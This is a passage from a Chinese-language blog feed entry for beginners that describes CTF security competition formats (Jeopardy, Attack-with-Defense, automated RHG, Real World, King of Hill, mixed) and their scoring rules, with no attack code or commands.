href="#RW-%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C">RW-真实世界</a>，<a href="#KoH-%E6%8A%A2%E5%8D%A0%E5%B1%B1%E5%A4%B4">KoH-抢占山头</a>，<a href="#Mix-%E6%B7%B7%E5%90%88">MIX-混合</a></p><h2 id="理论类"><a href="#理论类" class="headerlink" title="理论类"></a>理论类</h2><p>​    理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h2><p>​    参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防"><a href="#AwD-攻防" class="headerlink" title="AwD-攻防"></a>AwD-攻防</h2><p>​    <strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化"><a href="#RHG-自动化" class="headerlink" title="RHG-自动化"></a>RHG-自动化</h2><p>​    <strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h2><p>​    <strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h2><p>​    <strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix-混合"></a>Mix-混合</h2><p>​    混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h1 id="-1"><a href="#-1" class="headerlink" title></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="萌新" scheme="https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"/>
    
  </entry>
  
</feed>
